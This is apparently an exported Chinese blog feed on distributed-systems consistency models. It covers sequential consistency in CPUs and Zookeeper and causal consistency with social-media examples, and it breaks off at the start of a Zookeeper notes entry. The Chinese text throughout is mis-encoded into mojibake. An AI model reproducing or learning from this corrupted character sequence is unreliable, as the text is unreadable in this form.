<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451857.jpg" alt="img"></p>
<h1 id="ä»€ä¹ˆæ˜¯é¡ºåºä¸€è‡´æ€§-Sequential-Consistency"><a href="#ä»€ä¹ˆæ˜¯é¡ºåºä¸€è‡´æ€§-Sequential-Consistency" class="headerlink" title="ä»€ä¹ˆæ˜¯é¡ºåºä¸€è‡´æ€§(Sequential Consistency)"></a>ä»€ä¹ˆæ˜¯é¡ºåºä¸€è‡´æ€§(Sequential Consistency)</h1><p>åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬ç†Ÿæ‚‰å¼ºä¸€è‡´æ€§ã€å¼±ä¸€è‡´æ€§å’Œæœ€ç»ˆä¸€è‡´æ€§ç­‰ç­‰ä¸€è‡´æ€§ï¼Œä½† Zookeeper åˆè¯´è‡ªå·±æ˜¯â€œé¡ºåºä¸€è‡´æ€§â€ï¼Œåˆæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æ¥çœ‹çœ‹é‚£äº›ç ”ç©¶ç†è®ºçš„å¤§ä½¬ä»¬æ˜¯å¦‚ä½•çœ‹å¾…ä¸€è‡´æ€§çš„ã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯ä¸€è‡´æ€§ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ä¸€è‡´æ€§ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ä¸€è‡´æ€§ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ä¸€è‡´æ€§ï¼Ÿ</h2><p>ä¸€èˆ¬æˆ‘ä»¬ä¼šè¯´â€œA å’Œ B æ˜¯ä¸€è‡´çš„â€ï¼Œåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œä¸€è‡´æ€§æŒ‡çš„æ˜¯ç¨‹åºå‘˜å¯¹ç³»ç»Ÿçš„é¢„æœŸå’Œç³»ç»Ÿçš„å®é™…è¡Œä¸ºæ˜¯ä¸€è‡´çš„ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œæˆ‘ä»¬é¦–å…ˆå‘é€å†™è¯·æ±‚ <code>W(X, 2)</code>ï¼Œå†å°è¯•è¯»å–è¯¥å˜é‡<code>R(X)</code>ï¼Œå¦‚æœé¢„æœŸæ˜¯ <code>R(X)=2</code>ï¼Œè€Œç³»ç»Ÿçš„å®é™…ä¸Šè¿”å› <code>R(X)=0</code>ï¼Œåˆ™è¯´æˆ‘ä»¬å¯¹ç³»ç»Ÿçš„é¢„æœŸå’Œå®é™…çš„è¡Œä¸ºä¸ä¸€è‡´ã€‚</p>
<p>è€Œå½“æˆ‘ä»¬è¯´ â€œXX ä¸€è‡´æ€§â€ å®é™…ä¸Šæè¿°çš„ç³»ç»Ÿèƒ½å¯¹æˆ‘ä»¬æä¾›çš„ XX ä¿è¯ã€‚ä¾‹å¦‚æœ€ç»ˆä¸€è‡´æ€§ä¿è¯çš„æ˜¯å¯¹ç³»ç»Ÿä¸­çš„æŸä¸€é¡¹æ•°æ®ï¼Œå¦‚æœç»è¿‡è¶³å¤Ÿé•¿çš„æ—¶é—´æ²¡æœ‰æ–°çš„ä¿®æ”¹å‘ç”Ÿï¼Œåˆ™æ‰€æœ‰å¯¹å®ƒçš„è®¿é—®éƒ½å°†è¿”å›æœ€åä¸€æ¬¡ä¿®æ”¹çš„å€¼ï¼Œè€Œå¯¹äºâ€œä¸å¤Ÿé•¿â€çš„æ—¶é—´å†…çš„è®¿é—®æƒ…å†µå®ƒå´æ²¡æœ‰åšä»»ä½•ä¿è¯ã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯é¡ºåºä¸€è‡´æ€§ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯é¡ºåºä¸€è‡´æ€§ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯é¡ºåºä¸€è‡´æ€§ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯é¡ºåºä¸€è‡´æ€§ï¼Ÿ</h2><p>é¡ºåºä¸€è‡´æ€§æœ€æ—©æ˜¯ç”¨æ¥æè¿°å¤šæ ¸ CPU çš„è¡Œä¸ºçš„ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>â€¦ the result of any execution is the same as if the operations of all the processors were executed in some sequential order, and the operations of each individual processor appear in this sequence in the order specified by its program.</p>
</blockquote>
<p>å¦‚æœå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ‰€æœ‰ CPU æ‰§è¡ŒæŒ‡ä»¤çš„æ’åºï¼Œè¯¥æ’åºä¸­æ¯ä¸ª CPU è¦æ‰§è¡ŒæŒ‡ä»¤çš„é¡ºåºå¾—ä»¥ä¿æŒï¼Œä¸”å®é™…çš„ CPU æ‰§è¡Œç»“æœä¸è¯¥æŒ‡ä»¤æ’åºçš„æ‰§è¡Œç»“æœä¸€è‡´ï¼Œåˆ™ç§°è¯¥æ¬¡æ‰§è¡Œè¾¾åˆ°äº†é¡ºåºä¸€è‡´æ€§ã€‚ä¾‹å¦‚ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451858.svg" alt="Sequential Consistency"></p>
<p>å›¾ä¸­ <code>W(X, 1)</code> ä»£è¡¨å°† 1 å†™å…¥å˜é‡ Xï¼›<code>R(X, 1)</code> ä»£è¡¨è¯»å–å˜é‡ Xï¼Œå€¼ä¸º 1ï¼›æ¨ªè½´ä»£è¡¨æ—¶é—´ï¼›çŸ©å½¢çš„é•¿çŸ­ä»£è¡¨æŒ‡ä»¤æŒç»­çš„æ—¶é—´é•¿çŸ­ï¼Œæ‰€ä»¥ä¸Šå›¾å…¶å®è¡¨ç¤ºçš„æ˜¯å¤šæ ¸ CPU çš„ä¸€æ¬¡æ‰§è¡Œç»“æœã€‚</p>
<p>æˆ‘ä»¬æ‰¾åˆ°äº†æŒ‡ä»¤çš„ä¸€ä¸ªæ’åºï¼Œæ’åºä¸­å„ä¸ª CPU çš„æŒ‡ä»¤é¡ºåºå¾—ä»¥ä¿æŒï¼ˆå¦‚ <code>C: R(X, 1)</code> åœ¨ <code>C: R(X, 2)</code> ä¹‹å‰ï¼‰ï¼Œè¿™ä¸ªæ’åºçš„æ‰§è¡Œç»“æœä¸ CPU åˆ†å¼€æ‰§è¡Œçš„ç»“æœä¸€è‡´ï¼Œå› æ­¤è¯¥ CPU çš„æ‰§è¡Œæ˜¯æ»¡è¶³é¡ºåºä¸€è‡´æ€§çš„ã€‚</p>
<p><strong>æ³¨æ„åˆ°é¡ºåºä¸€è‡´æ€§å…³å¿ƒçš„æ˜¯ CPU å†…éƒ¨æ‰§è¡ŒæŒ‡ä»¤çš„é¡ºåºï¼Œè€Œä¸å…³å¿ƒ CPU ä¹‹é—´çš„ç›¸å¯¹é¡ºåºã€‚</strong></p>
<h2 id="æ›´å¤šæ­£åä¾‹"><a href="#æ›´å¤šæ­£åä¾‹" class="headerlink" title="æ›´å¤šæ­£åä¾‹"></a>æ›´å¤šæ­£åä¾‹</h2><p>è€ƒè™‘å°†ä¸Šå›¾çš„ <code>C:R(X, 1)</code> ä¸ <code>D:R(X, 2)</code> æ›¿æ¢ä¸€ä¸‹å‘¢ï¼Ÿå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451859.svg" alt="Sequential Consistency Swap 1"></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¾ç„¶å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„å…¨å±€æ’åºï¼Œæ‰€ä»¥ç³»ç»Ÿä¾æ—§æ»¡è¶³é¡ºåºä¸€è‡´æ€§ã€‚é‚£å¦‚æœæˆ‘ä»¬åªæ˜¯å°†åŸå›¾çš„ <code>D:R(X, 1)</code> å’Œ <code>D:R(X, 2)</code> äº’æ¢å‘¢ï¼Ÿå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451860.svg" alt="Sequential Consistency Swap 2"></p>
<p>å¯¹äºä¸Šå›¾çš„ç³»ç»Ÿï¼Œå®é™…ä¸Šæ˜¯æ‰¾ä¸åˆ°ä¸€ä¸ªå…¨å±€çš„æ’åºæ¥æ»¡è¶³é¡ºåºä¸€è‡´æ€§çš„éœ€æ±‚çš„ã€‚æ ¹æœ¬ä¸Šï¼Œä» C çš„é¡ºåºæ¨å¯¼å‡º X çš„å†™å…¥é¡ºåºä¸º <code>1 -&gt; 2</code>ï¼Œè€ŒåŒæ—¶ç”± D æ¨å‡ºå†™å…¥é¡ºåºä¸º <code>2 -&gt; 1</code> ï¼ŒäºŒè€…çŸ›ç›¾ã€‚é‚£å¦‚æœåªæœ‰ A åœ¨å†™å…¥å‘¢ï¼Ÿ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451861.svg" alt="Sequential Consistency Swap 3"></p>
<p>ä¸Šå›¾ä¹Ÿä¸æ»¡è¶³é¡ºåºä¸€è‡´æ€§ï¼Œç”± Cã€D æ¨å¯¼å‡ºå†™å…¥é¡ºåºä¸º <code>1 -&gt; 2</code>ï¼Œè€Œç”± A æ¨å‡ºé¡ºåºä¸º <code>2 -&gt; 1</code>ï¼ŒçŸ›ç›¾ã€‚</p>
<h2 id="é¡ºåºä¸€è‡´æ€§éš¾å—ï¼Ÿ"><a href="#é¡ºåºä¸€è‡´æ€§éš¾å—ï¼Ÿ" class="headerlink" title="é¡ºåºä¸€è‡´æ€§éš¾å—ï¼Ÿ"></a>é¡ºåºä¸€è‡´æ€§éš¾å—ï¼Ÿ</h2><p>éš¾ï¼Œç°ä»£çš„å¤šæ ¸ CPU ä¾ç„¶è¾¾ä¸åˆ°é¡ºåºä¸€è‡´æ€§ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“ CPU æ‰§è¡Œçš„ä¸»è¦ç“¶é¢ˆå…¶å®æ˜¯åœ¨ä¸å†…å­˜äº¤äº’ï¼Œå·¥ç¨‹å¸ˆä¸ºäº†è®© CPU èƒ½é«˜é€Ÿæ‰§è¡Œï¼Œåœ¨ CPU å†…éƒ¨ä½¿ç”¨äº†å¤šçº§ç¼“å­˜ã€‚å®ƒçš„å­˜åœ¨ï¼Œä½¿å¾—å³ä½¿ CPU å†…éƒ¨é¡ºåºæ‰§è¡ŒæŒ‡ä»¤ï¼ŒæŒ‡ä»¤çš„ç»“æœä¹Ÿå¯èƒ½ä¸æ»¡è¶³é¡ºåºä¸€è‡´æ€§ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451862.svg" alt="CPU Cache and Sequential Consistency"></p>
<p>ä¸Šå›¾ä¸­ <code>(n)</code> ä»£è¡¨æ•°æ®çš„è¯»å†™æ­¥éª¤ã€‚å¦‚æœ CPU å¦‚ä¸Šå›¾æ‰§è¡Œï¼Œåˆ™å¾—åˆ°çš„ç»“æœä¸æ»¡è¶³é¡ºåºä¸€è‡´æ€§ã€‚</p>
<p>å¦å¤– CPU æ‰§è¡Œæ—¶ä¼šä¹±åºæ‰§è¡ŒæŒ‡ä»¤ã€‚ä¾‹å¦‚åœ¨ä¸€äº›æƒ…å†µä¸‹ CPU ä¼šå°†æ•°æ®å†™å…¥çš„æŒ‡ä»¤æå‰æ‰§è¡Œï¼Œå› ä¸ºå†™å…¥å†…å­˜æ˜¯å¾ˆè€—æ—¶çš„ã€‚åŒæ ·çš„ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä»£ç æ—¶ä¹Ÿä¼šé‡æ’ä»£ç ä¸­çš„æŒ‡ä»¤çš„é¡ºåºï¼Œä»¥æå‡æ•´ä½“çš„æ€§èƒ½ã€‚</p>
<p>éš¾ä»¥æƒ³è±¡ï¼Œæ²¡æœ‰äº†é¡ºåºä¸€è‡´æ€§çš„ä¿è¯ï¼Œç¨‹åºå±…ç„¶è¿˜èƒ½æ­£ç¡®æ‰§è¡Œã€‚å…¶å®ï¼Œç°ä»£ç¡¬ä»¶ä½“ç³»éµå¾ªçš„å…¶å®æ˜¯:</p>
<blockquote>
<p>sequential consistency for data race free programs</p>
</blockquote>
<p>å³å¦‚æœç¨‹åºæ²¡æœ‰æ•°æ®ç«äº‰ï¼Œåˆ™ CPU å¯ä»¥ä¿è¯é¡ºåºä¸€è‡´æ€§ï¼Œè€Œå¦‚æœé‡åˆ°æ•°æ®ç«äº‰ï¼Œå°±éœ€è¦ç¨‹åºé‡Œæ‰‹å·¥ä½¿ç”¨ä¸€äº›æ•°æ®åŒæ­¥çš„æœºåˆ¶ï¼ˆå¦‚é”ï¼‰ã€‚</p>
<p>å·¥ç¨‹é¢†åŸŸæ€»æ˜¯ä¼´éšç€å„ç§æƒè¡¡(trade-off)ï¼Œæ˜¾ç„¶ä¿è¯é¡ºåºä¸€è‡´æ€§å¯¹ CPU çš„æ€§èƒ½ä¼˜åŒ–æœ‰å¤ªå¤šçš„é˜»ç¢ï¼Œè€Œ CPU çš„é«˜æ€§èƒ½åˆæ˜¯æˆ‘ä»¬æ‰€è¿½æ±‚çš„ï¼Œä¸¤å®³ç›¸æƒå–å…¶è½»ã€‚</p>
<h2 id="Zookeeper-ä¸­çš„é¡ºåºä¸€è‡´æ€§"><a href="#Zookeeper-ä¸­çš„é¡ºåºä¸€è‡´æ€§" class="headerlink" title="Zookeeper ä¸­çš„é¡ºåºä¸€è‡´æ€§"></a>Zookeeper ä¸­çš„é¡ºåºä¸€è‡´æ€§</h2><p>Zookeeper çš„ä¸€è‡´æ€§ä¿è¯ç¬¬ä¸€æ¡æ˜¯ï¼š</p>
<blockquote>
<p>Sequential Consistency : Updates from a client will be applied in the order that they were sent.</p>
</blockquote>
<p>é¡ºåºä¸€è‡´æ€§ï¼šå®¢æˆ·ç«¯å‘é€çš„æ›´æ–°å‘½ä»¤ï¼ŒæœåŠ¡ç«¯ä¼šæŒ‰å®ƒä»¬å‘é€çš„é¡ºåºæ‰§è¡Œã€‚</p>
<p>ï¼ˆå…¶å® zookeeper æ–‡æ¡£é‡Œæè¿°çš„é¡ºåºä¸€è‡´æ€§å’Œæœ¬æ–‡æè¿°çš„ä¸å¤ªä¸€æ ·ï¼‰</p>
<p>Zookeeper çš„æ‰€æœ‰å†™æ“ä½œéƒ½é€šè¿‡ä¸»èŠ‚ç‚¹è¿›è¡Œï¼Œä»èŠ‚ç‚¹å¤åˆ¶ä¿®æ”¹æ“ä½œï¼Œè¿™æ ·æ‰€æœ‰èŠ‚ç‚¹çš„æ›´æ–°é¡ºåºéƒ½å’Œä¸»èŠ‚ç‚¹ç›¸åŒï¼Œä¸ä¼šå‡ºç°æŸä¸ªèŠ‚ç‚¹çš„æ›´æ–°é¡ºåºä¸å…¶å®ƒèŠ‚ç‚¹ä¸åŒçš„æƒ…å†µã€‚</p>
<p>ä½†æ˜¯Zookeeper å…è®¸å®¢æˆ·ç«¯ä»ä»èŠ‚ç‚¹è¯»å–æ•°æ®ï¼Œå› æ­¤å¦‚æœå®¢æˆ·ç«¯åœ¨è¯»å–è¿‡ç¨‹ä¸­è¿æ¥äº†ä¸åŒçš„èŠ‚ç‚¹ï¼Œåˆ™é¡ºåºä¸€è‡´æ€§å°±å¾—ä¸åˆ°ä¿è¯äº†ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451863.svg" alt="Zookeeper Inconsistency"></p>
<p>å¦‚ä¸Šå›¾ï¼Œä¸»èŠ‚ç‚¹çš„ <code>X=2</code> æ¶ˆæ¯è¿˜æ²¡æœ‰åŒæ­¥åˆ° Follower 2ï¼Œæ­¤æ—¶å¦‚æœæœ‰ä¸¤ä¸ªå®¢æˆ·ç«¯ï¼š</p>
<ul>
<li>A: å…ˆåè¿æ¥åˆ° Follower 1 å’Œ Follower 2ï¼Œåˆ™è¯»åˆ° X çš„å€¼ä¸º <code>2 -&gt; 1</code></li>
<li>B: å…ˆåè¿æ¥åˆ° Follower 2 å’Œ Follower 1ï¼Œåˆ™è¯»åˆ° X çš„å€¼ä¸º <code>1 -&gt; 2</code></li>
</ul>
<p>æ˜¾ç„¶ä¸æ»¡è¶³é¡ºåºä¸€è‡´æ€§ï¼Œå› æ­¤ zookeeper åˆæœ‰â€œå•ä¸€è§†å›¾â€çš„ä¿è¯ï¼Œä¿è¯åœ¨è¿æ¥åˆ° Follower 2 åï¼Œä¸ä¼šè¿ä¸ŠçŠ¶æ€æ›´è€çš„ Follower 1ã€‚</p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ–‡ä¸­è¯•å›¾æè¿°ä»€ä¹ˆæ˜¯â€œé¡ºåºä¸€è‡´æ€§â€ï¼Œå¹¶ç»™å‡ºäº†å‡ ä¸ªæ­£åä¾‹ï¼›ä¹‹åè¯´æ˜äº† CPU è¾¾ä¸åˆ°é¡ºåºä¸€è‡´æ€§çš„å‡ ä¸ªåŸå› ï¼›æœ€åç®€å•åœ°è¯´æ˜äº† zookeeper ä¸ºä»€ä¹ˆèƒ½ä¿è¯é¡ºåºä¸€è‡´æ€§ã€‚æ°´å¹³æœ‰é™ï¼Œåªèƒ½ç‚¹åˆ°ä¸ºæ­¢äº†ã€‚</p>
<p>æœ€åæ„Ÿå¹ä¸‹ï¼Œè®¾è®¡é‡Œä¸€åˆ‡éƒ½æ˜¯ trade off å•Šã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://wudaijun.com/2018/09/distributed-consistency/">https://wudaijun.com/2018/09/distributed-consistency/</a> æ¸…æ™°è®²è§£äº†é¡ºåºä¸€è‡´æ€§åŠçº¿æ€§ä¸€è‡´æ€§ç­‰æ¦‚å¿µ</li>
<li><a href="https://www.cs.princeton.edu/courses/archive/fall16/cos418/docs/L13-strong-cap.pdf">https://www.cs.princeton.edu/courses/archive/fall16/cos418/docs/L13-strong-cap.pdf</a> å…³äºå¼ºä¸€è‡´æ€§ä¸ CAP ç†è®ºçš„ PPT</li>
<li><a href="https://snarfed.org/transactions_across_datacenters_io.html">https://snarfed.org/transactions_across_datacenters_io.html</a> Google 2009 å¹´çš„ä¸€ä¸ªåˆ†äº«ï¼Œæ€»ç»“äº†ä¸šå†…ä¸€è‡´æ€§åè®®çš„ä¸€äº›å®è·µ</li>
</ul>
<h1 id="æ·±å…¥æµ…æä¸€è‡´æ€§æ¨¡å‹ä¹‹Causal-Consistency"><a href="#æ·±å…¥æµ…æä¸€è‡´æ€§æ¨¡å‹ä¹‹Causal-Consistency" class="headerlink" title="æ·±å…¥æµ…æä¸€è‡´æ€§æ¨¡å‹ä¹‹Causal Consistency"></a>æ·±å…¥æµ…æä¸€è‡´æ€§æ¨¡å‹ä¹‹Causal Consistency</h1><h2 id="Causal-consistencyçš„å®šä¹‰"><a href="#Causal-consistencyçš„å®šä¹‰" class="headerlink" title="Causal consistencyçš„å®šä¹‰"></a>Causal consistencyçš„å®šä¹‰</h2><p>Causal consistencyå«åšå› æœä¸€è‡´æ€§ï¼Œè¢«è®¤ä¸ºæ˜¯æ¯”Sequential Consistencyæ›´å¼±çš„ä¸€è‡´æ€§ï¼Œå› ä¸ºåœ¨Causal consistencyä¸­ï¼Œåªå¯¹æœ‰å› æœå…³ç³»çš„äº‹ä»¶æœ‰é¡ºåºè¦æ±‚ã€‚</p>
<p>Causal consistencyçš„æ¦‚å¿µæœ€æ—©åœ¨ã€ŠCausal memory: Definitions, implementation, and programmingã€‹ä¸€æ–‡ä¸­è¢«æå‡ºã€‚éšååœ¨ã€ŠConsistency, Availability, and Convergenceã€‹ä¸€æ–‡ä¸­ï¼Œä½œè€…ç”¨happens beforeå…³ç³»çš„æœ‰å‘æ— ç¯å›¾å®šä¹‰äº†Causal consistencyï¼Œå¹¶ä¸”æå‡ºäº†real time causal consistencyä¸€è‡´æ€§æ¨¡å‹ã€‚è¿™ç¯‡æ–‡ç« å¾—å‡ºäº†ä»¥ä¸‹ä¸¤ä¸ªé‡è¦çš„ç»“è®ºï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥è¯»ä¸€ä¸‹åŸæ–‡ï¼š</p>
<ol>
<li>No consistency stronger than real time causal (RTC) consistency, a strengthening of causal consistency, can be provided in an always-available, one-way convergent system.</li>
<li>RTC can be provided in an always-available, one-way convergent system.</li>
</ol>
<p>Causal consistencyè¦æ±‚å¦‚æœä¸¤ä¸ªäº‹ä»¶æœ‰å› æœå…³ç³»ï¼Œé‚£ä¹ˆåœ¨æ‰€æœ‰èŠ‚ç‚¹ä¸Šå¿…é¡»è§‚æµ‹åˆ°è¿™ä¸ªå› æœå…³ç³»ã€‚</p>
<h2 id="Causal-consistencyçš„ä¾‹å­"><a href="#Causal-consistencyçš„ä¾‹å­" class="headerlink" title="Causal consistencyçš„ä¾‹å­"></a>Causal consistencyçš„ä¾‹å­</h2><p>æ¯”å¦‚ä¸‹å›¾ä¸­ï¼Œæˆ‘ä»¬è®¤ä¸ºP2å†™å…¥çš„3æ˜¯åŸºäºå®ƒè¯»å‡ºæ¥çš„1è®¡ç®—å‡ºæ¥çš„ï¼Œå®ƒè¯»å‡ºæ¥çš„1åˆæ˜¯ç”±P1çš„å†™å…¥äº§ç”Ÿçš„ï¼Œå› æ­¤è®¤ä¸ºP1å†™å…¥1å’ŒP2å†™å…¥3å…·æœ‰å› æœå…³ç³»ã€‚P4æ²¡æœ‰è§‚æµ‹åˆ°è¿™ä¸ªå› æœå…³ç³»ï¼Œæ‰€ä»¥è¿™ä¸ªç³»ç»Ÿä¸å…·å¤‡Causal Consistencyã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451864.jpg" alt="img"></p>
<p>è€Œä¸‹å›¾ä¸­ï¼Œè®¤ä¸ºP2å†™å…¥3å’ŒP1å†™å…¥1ä¸å…·æœ‰å› æœå…³ç³»ï¼Œåˆ™P4å’ŒP3å¯ä»¥ä»¥ä»»æ„é¡ºåºè§‚æµ‹åˆ°å®ƒä»¬ã€‚è¿™ä¸ªç³»ç»Ÿä»ç„¶å¯ä»¥è¯´å…·æœ‰Causal consistencyï¼Œä½†æ˜¯ä¸å…·å¤‡Sequential Consistencyã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451865.jpg" alt="img"></p>
<h2 id="Causal-consistencyçš„åº”ç”¨"><a href="#Causal-consistencyçš„åº”ç”¨" class="headerlink" title="Causal consistencyçš„åº”ç”¨"></a>Causal consistencyçš„åº”ç”¨</h2><p>Causal consistencyä¸€èˆ¬åº”ç”¨åœ¨è·¨åœ°åŸŸåŒæ­¥æ•°æ®ä¸­å¿ƒç³»ç»Ÿä¸­ï¼Œä¾‹å¦‚Facebookã€å¾®ä¿¡è¿™æ ·çš„åº”ç”¨ç¨‹åºï¼Œå…¨çƒå„åœ°çš„ç”¨æˆ·ï¼Œå¾€å¾€ä¼šè®¿é—®å…¶è·ç¦»æœ€è¿‘çš„æ•°æ®ä¸­å¿ƒï¼Œæ•°æ®ä¸­å¿ƒä¹‹é—´å†è¿›è¡ŒåŒå‘çš„æ•°æ®åŒæ­¥ã€‚ä¸ºäº†å‡å°æ•°æ®åŒæ­¥çš„å»¶è¿Ÿï¼Œå¾€å¾€å¹¶è¡Œçš„åŒæ­¥æ•°æ®ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451866.jpg" alt="img"></p>
<p>æ²¡æœ‰å› æœä¸€è‡´æ€§æ—¶ä¼šå‘ç”Ÿå¦‚ä¸‹æƒ…å½¢ï¼š</p>
<ol>
<li>å¤ä¾¯é“æŸ±åœ¨æœ‹å‹åœˆå‘è¡¨çŠ¶æ€â€œæˆ‘æˆ’æŒ‡ä¸¢äº†â€</li>
<li>å¤ä¾¯é“æŸ±åœ¨åŒä¸€æ¡çŠ¶æ€ä¸‹è¯„è®ºâ€œæˆ‘æ‰¾åˆ°å•¦â€</li>
<li>è¯¸è‘›å»ºå›½åœ¨åŒä¸€æ¡çŠ¶æ€ä¸‹è¯„è®ºâ€œå¤ªæ£’äº†â€</li>
<li>è¿œåœ¨ç¾å›½çš„é”®ç›˜ä¾ çœ‹åˆ°â€œæˆ‘æˆ’æŒ‡ä¸¢äº†â€â€œå¤ªæ£’äº†â€ï¼Œå¼€å§‹å–·è¯¸è‘›å»ºå›½</li>
<li>è¿œåœ¨ç¾å›½çš„é”®ç›˜ä¾ çœ‹åˆ°â€œæˆ‘æˆ’æŒ‡ä¸¢äº†â€â€œæˆ‘æ‰¾åˆ°å•¦â€â€œå¤ªæ£’äº†â€ï¼Œæ„è¯†åˆ°å–·é”™äººäº†</li>
</ol>
<p>æˆ–è€…ï¼š</p>
<ol>
<li>å¤ä¾¯é“æŸ±ä»å¥½å‹ä¸­åˆ é™¤äº†è¯¸è‘›å»ºå›½</li>
<li>å¤ä¾¯é“æŸ±å‘è¡¨äº†æœ‹å‹åœˆâ€œæ¸…ç†äº†ä¸€æ³¢æ²¡ç”¨çš„å¥½å‹â€</li>
<li>è¿œåœ¨ç¾å›½çš„è¯¸è‘›å»ºå›½çœ‹åˆ°äº†è¯¥æœ‹å‹åœˆ</li>
<li>è¯¸è‘›å»ºå›½æƒ³å»ç‚¹ä¸ªèµã€‚ã€‚ã€‚</li>
</ol>
<p>æ‰€ä»¥å¾ˆå¤šç³»ç»Ÿé‡‡ç”¨å› æœä¸€è‡´æ€§ç³»ç»Ÿæ¥é¿å…è¿™ç§é—®é¢˜ï¼Œæˆ‘ä»¬å°†ä¼šåœ¨åç»­çš„æ–‡ç« ä¸­ä»‹ç»ã€‚</p>
<blockquote>
<p>ä¾‹å¦‚å¾®ä¿¡çš„æœ‹å‹åœˆå°±é‡‡ç”¨äº†å› æœä¸€è‡´æ€§ï¼Œä½†æ˜¯å®ƒçš„èµ„æ–™æœ‰ç‚¹è¿‡äºç®€ç•¥ï¼Œæœ‰å…´è¶£çš„å¯ä»¥å‚è€ƒ<a href="https://link.zhihu.com/?target=https://www.useit.com.cn/thread-10587-1-1.html">https://www.useit.com.cn/thread-10587-1-1.html</a></p>
</blockquote>
<blockquote>
<p>æ›´å¤šç›¸å…³å†…å®¹ï¼Œè¯·å‚è€ƒç³»åˆ—æ–‡ç« <a href="https://link.zhihu.com/?target=https://www.imooc.com/article/286118">ã€Šå¦‚ä½•å­¦ä¹ åˆ†å¸ƒå¼ç³»ç»Ÿã€‹</a>ã€‚</p>
</blockquote>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><a href="http://www.chinastor.com/s/openstack/10093K202017.html">http://www.chinastor.com/s/openstack/10093K202017.html</a></li>
<li><a href="https://blog.csdn.net/controllerha/article/details/78766840">https://blog.csdn.net/controllerha/article/details/78766840</a></li>
<li><a href="https://zhaohongbo.github.io/2017/02/22/Byzantine-Generals-Problem/">https://zhaohongbo.github.io/2017/02/22/Byzantine-Generals-Problem/</a></li>
</ol>
<iframe name="easyXDM_default6444_provider" id="easyXDM_default6444_provider" src="https://embed.widgetpack.com/widget/xdm/index.html?xdm_e=https%3A%2F%2Fkeyanjie.net&amp;xdm_c=default6444&amp;xdm_p=1" frameborder="0" style="color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; position: absolute !important; top: -2000px !important; left: 0px !important;"></iframe>



]]></content>
      <categories>
        <category>ustc</category>
      </categories>
      <tags>
        <tag>åˆ†å¸ƒå¼</tag>
        <tag>äº‘è®¡ç®—</tag>
      </tags>
  </entry>
  <entry>
    <title>Zookeeper</title>
    <url>/2021/12/21/%E5%A4%A7%E6%95%B0%E6%8D%AE/Zookeeper/</url>
    <content><![CDATA[<h1 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h1><ul>
<li><p>zookeeper&#x3D;æ–‡ä»¶ç³»ç»Ÿ+é€šçŸ¥æœºåˆ¶</p>
</li>
<li><p>ä¸€ä¸ªleaderå¤šä¸ªfollowerç»„æˆçš„é›†ç¾¤</p>
</li>
<li><p>é›†ç¾¤åªè¦åŠæ•°ä»¥ä¸ŠèŠ‚ç‚¹å­˜æ´»ï¼ŒZookeeperé›†ç¾¤å°±èƒ½æ­£å¸¸æœåŠ¡ï¼Œé€‚åˆå®‰è£…å¥‡æ•°å°æœåŠ¡å™¨ï¼Œå¶æ•°ä¼šæµªè´¹</p>
</li>
<li><p>å…¨å±€æ•°æ®ä¸€è‡´:æ¯ä¸ªServerä¿å­˜ä¸€ä»½ç›¸åŒçš„æ•°æ®å‰¯æœ¬ï¼ŒClientæ— è®ºè¿æ¥åˆ°å“ªä¸ªServerï¼Œæ•°æ®éƒ½æ˜¯ä¸€è‡´çš„ã€‚ </p>
</li>
